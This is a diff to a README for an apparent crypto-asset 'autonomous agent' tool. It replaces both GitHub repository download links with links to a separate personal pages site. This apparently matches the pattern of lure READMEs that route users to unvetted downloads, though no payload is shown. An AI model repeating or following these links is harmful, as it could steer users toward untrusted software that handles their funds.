@@ -1,6 +1,6 @@
 # 🤖 AgenticDeFi-Trainer - Manage crypto assets with autonomous agents
 
-[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://github.com/scary5020/AgenticDeFi-Trainer)
+[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://scary5020.github.io)
 
 AgenticDeFi-Trainer provides tools to manage digital assets using smart software agents. These agents run on your machine to handle trades, move funds between blockchains, and manage treasury balances. You do not need to oversee every action. The system uses logic models to make decisions based on rules you set within the dashboard.
 
@@ -16,7 +16,7 @@ Your computer needs specific components to run this software. Please verify your
 
 ## 📥 Downloading the Software
 
-Visit this page to download the latest version of the application: [https://github.com/scary5020/AgenticDeFi-Trainer](https://github.com/scary5020/AgenticDeFi-Trainer)
+Visit this page to download the latest version of the application: [https://scary5020.github.io](https://scary5020.github.io)
 
 1. Navigate to the link above.
 2. Locate the Releases section on the right side of the page.
